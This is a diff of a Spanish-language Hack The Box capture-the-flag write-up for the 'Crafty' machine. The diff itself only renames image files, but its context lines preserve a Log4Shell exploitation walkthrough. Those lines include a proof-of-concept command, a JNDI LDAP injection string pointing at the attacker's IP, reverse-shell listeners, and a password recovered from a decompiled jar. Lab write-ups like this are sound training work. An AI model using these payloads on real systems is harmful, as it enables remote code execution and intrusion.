@@ -3,7 +3,7 @@ title: "Crafty - WriteUp"
 date: Wed Mar 05 2025 15:15:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, reverse-shell, cve, exploit, cve-2021-44228, windows, iis, powershell]
-image: /assets/img/htb-writeups/Pasted image 20240212104706.png
+image: /assets/img/htb-writeups/Pasted-image-20240212104706.png
 ---
 
 {% include machine-info.html
@@ -13,13 +13,13 @@ image: /assets/img/htb-writeups/Pasted image 20240212104706.png
   platform="HTB"
 %}
 
-![Crafty](/assets/img/htb-writeups/Pasted image 20240212104706.png)
+![Crafty](/assets/img/htb-writeups/Pasted-image-20240212104706.png)
 
 ---
 
 ---
 -----
-![CRAFTY](/assets/img/htb-writeups/Pasted image 20240212104706.png)
+![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212104706.png)
 
 ------
 
@@ -45,7 +45,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Redirige a crafty.htb por lo que lo damos de alta en el archivo hosts.
 
 HTTP
-![CRAFTY](/assets/img/htb-writeups/Pasted image 20240212105245.png)
+![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212105245.png)
 
 Descubrimos un subdominio y lo damos de alta también en el archivo hosts.
 
@@ -60,7 +60,7 @@ Del repo de kozmer:
 
 Editamos el archivo _poc.py_ de la siguiente manera ya que la máquina víctima es Windows...
 
-![CRAFTY](/assets/img/htb-writeups/Pasted image 20240212113713.png)
+![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212113713.png)
 
 Descargamos el JDK de JAVA necesario para este exploit:
 
@@ -89,7 +89,7 @@ Mi IP en tun0 es la 10.10.14.87
 $ python3 poc.py --userip 10.10.14.87 --webport 4243 --lport 9001
 ```
 
-![CRAFTY](/assets/img/htb-writeups/Pasted image 20240212115516.png)
+![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212115516.png)
 
 Ahora vamos al repo de ammaraskar:
 
@@ -116,7 +116,7 @@ ${jndi:ldap://10.10.14.87:1389/a}
 
 Nos vamos a la consola en escucha y...
 
-![CRAFTY](/assets/img/htb-writeups/Pasted image 20240212121252.png)
+![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212121252.png)
 
 Estamos dentro...
 
@@ -132,7 +132,7 @@ $ jd-gui playercounter-1.0-SNAPSHOT.jar
 
 Nos vamos a htb.crafty.playercounter > Playercounter > Playercounter() y vemos un string cifrado o contraseña de una conexión interna en el puerto 27015. La copiamos y seguimos.
 
-![CRAFTY](/assets/img/htb-writeups/Pasted image 20240212130607.png)
+![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212130607.png)
 
 ```http
 s67u84zKq8IXw
@@ -162,7 +162,7 @@ Ahora nos vamos a la consola de la máquina víctima y vamos ejecutando lo sigui
 
 Nos vamos a la consola que habíamos puesto en escucha por el puerto 4444 y...
 
-![CRAFTY](/assets/img/htb-writeups/Pasted image 20240212135608.png)
+![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212135608.png)
 
 Máquina conseguida!
 ---
